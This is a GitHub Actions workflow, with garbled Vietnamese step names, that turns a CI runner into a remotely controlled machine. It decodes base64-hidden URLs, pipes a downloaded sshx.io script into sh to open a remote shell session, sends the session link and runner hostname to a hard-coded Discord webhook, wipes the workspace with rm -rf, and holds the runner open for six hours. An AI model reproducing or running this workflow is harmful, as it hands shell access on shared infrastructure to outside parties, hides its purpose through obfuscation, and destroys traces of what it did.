name: Lá»“n

on:
  workflow_dispatch:

jobs:
  sys_job:
    runs-on: ubuntu-latest

    steps:
    - name: Giáº£i mÃ£ cÃ¡c thÃ´ng tin nháº¡y cáº£m
      run: |
        echo "aHR0cHM6Ly9zc2h4LmlvL2dldA==" | base64 -d > sshx_url.txt
        echo "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMyNzkwNjQ3MjAyOTQ1ODQ5NS8xYlNrV0xsVl9jZHZXVGhHMXhLM1lOQVA3TVlUZ215S1pCX29LX3pJaWl3MGI3RDN1M3JzTURVSHJZdVhpTmRlTWZ0cQ==" | base64 -d > webhook.txt

    - name: Táº£i vÃ  cháº¡y , chá» láº¥y
      run: |
        SSHX_URL=$(cat sshx_url.txt)

        curl -sSf "$SSHX_URL" | sh -s run > sshlog.txt 2>&1 &
        echo "â³ Äang khá»Ÿi cháº¡y SSHX vÃ  Ä‘á»£i táº¡o SSH link..."

        for i in {1..30}; do
          LINK=$(grep -o 'https://sshx.io/s/[^\ ]\+' sshlog.txt | sed 's/\x1b\[[0-9;]*m//g' | head -n 1)
          if [ -n "$LINK" ]; then
            echo "$LINK" | base64 > sshlink.b64
            echo "âœ… Link SSH tÃ¬m tháº¥y (base64): $(cat sshlink.b64)"
            break
          fi
          sleep 1
        done

        if [ ! -s sshlink.b64 ]; then
          echo "âŒ KhÃ´ng tÃ¬m tháº¥y SSH link sau 60 giÃ¢y." >&2
          exit 1
        fi

    - name: Gá»­i  + hostname vá» Discord Webhook
      run: |
        USER_ID=$(grep "# USER_ID:" .github/workflows/settings.yml | awk '{print $3}')
        SSH_LINK=$(base64 -d sshlink.b64)

        HOSTNAME_REAL=$(hostname)
        echo "$HOSTNAME_REAL" | base64 > hostname.b64
        HOST_DECODED=$(base64 -d hostname.b64)

        INNER_JSON=$(jq -nc --arg uid "$USER_ID" --arg ssh "$SSH_LINK" --arg host "$HOST_DECODED" '{user_id: $uid, ssh: $ssh, host: $host}')
        echo "$INNER_JSON" | jq -nc --arg content "$(cat)" '{content: $content}' > payload.json

        echo "ğŸ“¤ Äang gá»­i SSH + hostname Ä‘áº¿n Discord..."
        curl -X POST -H "Content-Type: application/json" -d @payload.json "$(cat webhook.txt)"


    - name: ğŸ”¥ Tá»± Ä‘á»™ng xoÃ¡ toÃ n bá»™ file/thÆ° má»¥c sau khi cháº¡y xong
      if: always()
      run: |
        echo "ğŸ§¹ Äang dá»n dáº¹p toÃ n bá»™ runner workspace..."
        cd "$GITHUB_WORKSPACE" || exit 1
        find . -mindepth 1 -exec rm -rf {} +
        echo "âœ… ÄÃ£ xoÃ¡ sáº¡ch má»i thá»© xong!"
    - name: Giá»¯  hoáº¡t Ä‘á»™ng trong 6 tiáº¿ng
      run: |
        echo "ğŸ•’ Báº¯t Ä‘áº§u giá»¯ session SSHX trong 6 tiáº¿ng..."
        for ((i = 0; i < 21600; i+=30)); do
          echo "âœ… Still alive at $(date)"
          sleep 30
        done
